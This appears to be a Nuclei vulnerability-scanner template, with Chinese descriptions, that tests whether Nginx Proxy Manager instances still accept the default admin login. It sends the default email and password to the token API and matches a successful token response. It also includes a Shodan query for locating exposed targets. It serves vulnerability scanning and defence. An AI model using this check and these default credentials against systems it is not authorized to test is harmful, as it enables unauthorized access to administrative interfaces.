id: nginx-proxy-manager-default-login

info:
  name: Nginx Proxy Manager 默认口令登录（弱口令）
  author: barttran2000
  severity: high
  description: |
    该模板通过尝试 Nginx Proxy Manager 的默认账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者可直接登录系统，进一步访问敏感信息、修改配置或执行未授权操作。
  metadata:
    shodan-query: html:"Nginx Proxy Manager"
    verified: true
    max-request: 1
  tags: nginx,proxy-manager,default-login,vuln

http:
  - raw:
      - |
        POST /api/tokens HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"identity": "admin@example.com","secret": "changeme"}

    matchers:
      - type: dsl
        dsl:
          - contains_all(body, "{\"token", "expires\":")
          - contains(content_type, "application/json")
          - status_code == 200
        condition: and
